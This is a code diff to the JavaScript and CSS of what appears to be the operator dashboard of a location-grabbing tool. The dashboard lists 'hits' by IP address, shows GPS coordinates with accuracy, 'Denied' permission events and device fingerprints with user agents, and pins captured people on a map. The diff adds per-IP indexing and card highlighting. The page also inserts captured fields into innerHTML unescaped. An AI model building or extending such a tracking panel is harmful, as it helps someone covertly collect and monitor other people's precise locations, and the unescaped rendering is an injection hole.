@@ -251,6 +251,7 @@ body{display:flex}
 .omaps{display:inline-block;margin-top:8px;font-size:.75rem;color:#58a6ff;text-decoration:none;background:#1a2a3a;border:1px solid #58a6ff;border-radius:6px;padding:4px 10px}
 .status-bar{padding:6px 16px;font-size:.72rem;color:#8b949e;border-top:1px solid #30363d;flex-shrink:0}
 #empty{text-align:center;color:#8b949e;font-size:.85rem;padding:40px 20px}
+.card-selected{border-color:#58a6ff!important;box-shadow:0 0 0 2px rgba(88,166,255,.35);}
 </style>
 </head>
 <body>
@@ -273,12 +274,21 @@ body{display:flex}
 </div>
 <script src="/leaflet.js"></script>
 <script>
-var map=null,markers={},seen=new Set(),stats={g:0,d:0,a:0};
+var map=null,markers={},seen=new Set(),stats={g:0,d:0,a:0},capturesByIp={};
 function accColor(a){return a==null?'#8b949e':a<=20?'#3fb950':a<=100?'#f7b731':'#f85149';}
 function f(l,v){return '<div class="f"><div class="lb">'+l+'</div><div class="vl">'+(v||'N/A')+'</div></div>';}
 function updateStats(){document.getElementById('sg').textContent=stats.g;document.getElementById('sd').textContent=stats.d;document.getElementById('sa').textContent=stats.a;var t=stats.g+stats.d+stats.a;document.getElementById('hit-count').textContent=t+' hit'+(t===1?'':'s');}
+function highlightIp(ip){
+  document.querySelectorAll('.card').forEach(function(c){c.classList.remove('card-selected');});
+  var found=document.querySelectorAll('.card[data-ip="'+ip+'"]');
+  if(!found.length)return;
+  found.forEach(function(c){c.classList.add('card-selected');});
+  found[0].scrollIntoView({behavior:'smooth',block:'start'});
+}
 function addCard(d){
   if(seen.has(d._id))return;seen.add(d._id);
+  if(!capturesByIp[d._ip])capturesByIp[d._ip]=[];
+  capturesByIp[d._ip].push(d._id);
   var e=document.getElementById('empty');if(e)e.remove();
   var ep=d._endpoint||'',isGps=ep==='/location'&&!d.denied,isDeny=ep==='/location'&&d.denied;
   var badge=isGps?'<span class="bx gps">GPS</span>':isDeny?'<span class="bx deny">Denied</span>':'<span class="bx dev">Device</span>';
@@ -289,7 +299,12 @@ function addCard(d){
     var lbl=acc==null?'Unknown':acc<=20?'High +/-'+acc+'m':acc<=100?'Med +/-'+acc+'m':'Low +/-'+acc+'m';
     fields+=f('Latitude',d.lat!=null?d.lat.toFixed(7):'N/A')+f('Longitude',d.lon!=null?d.lon.toFixed(7):'N/A')+f('Accuracy',acc!=null?'+/- '+acc+' m':'N/A')+f('Altitude',d.alt!=null?d.alt.toFixed(1)+' m':'N/A');
     fields+='<div class="f wide"><div class="lb">'+lbl+'</div><div class="at"><div class="af" style="width:'+pct+'%;background:'+col+'"></div></div></div>';
-    if(map&&d.lat!=null&&d.lon!=null){var mk=L.circleMarker([d.lat,d.lon],{radius:10,fillColor:col,color:'#fff',weight:2,fillOpacity:.9}).addTo(map);mk.bindPopup('<b>'+d._ip+'</b><br/>'+d.lat.toFixed(6)+','+d.lon.toFixed(6)+'<br/>+/-'+Math.round(d.acc||0)+'m<br/><a href="https://www.google.com/maps?q='+d.lat+','+d.lon+'" target="_blank">Open Maps</a>');markers[d._id]=mk;}
+    if(map&&d.lat!=null&&d.lon!=null){
+      var mk=L.circleMarker([d.lat,d.lon],{radius:10,fillColor:col,color:'#fff',weight:2,fillOpacity:.9}).addTo(map);
+      mk.bindPopup('<b>'+d._ip+'</b><br/>'+d.lat.toFixed(6)+','+d.lon.toFixed(6)+'<br/>+/-'+Math.round(d.acc||0)+'m<br/><a href="https://www.google.com/maps?q='+d.lat+','+d.lon+'" target="_blank">Open Maps</a>');
+      (function(ip){mk.on('click',function(){highlightIp(ip);});})(d._ip);
+      markers[d._id]=mk;
+    }
     stats.g++;
   }else if(isDeny){fields+=f('Reason',d.reason);stats.d++;}
   else{
@@ -304,7 +319,7 @@ function addCard(d){
     if(d.userAgent)fields+='<div class="f wide"><div class="lb">User-Agent</div><div class="vl" style="font-size:.68rem">'+d.userAgent+'</div></div>';
     stats.a++;
   }
-  var div=document.createElement('div');div.className='card';
+  var div=document.createElement('div');div.className='card';div.setAttribute('data-ip',d._ip);div.setAttribute('id','card-'+d._id);
   div.innerHTML='<div class="card-hdr">'+badge+'<span class="ts">'+ts+'</span></div><div class="ip">'+d._ip+'</div><div class="fields">'+fields+'</div>'+(isGps&&d.lat!=null?'<a class="omaps" href="https://www.google.com/maps?q='+d.lat+','+d.lon+'" target="_blank">Open Maps</a>':'');
   document.getElementById('feed').prepend(div);updateStats();
 }
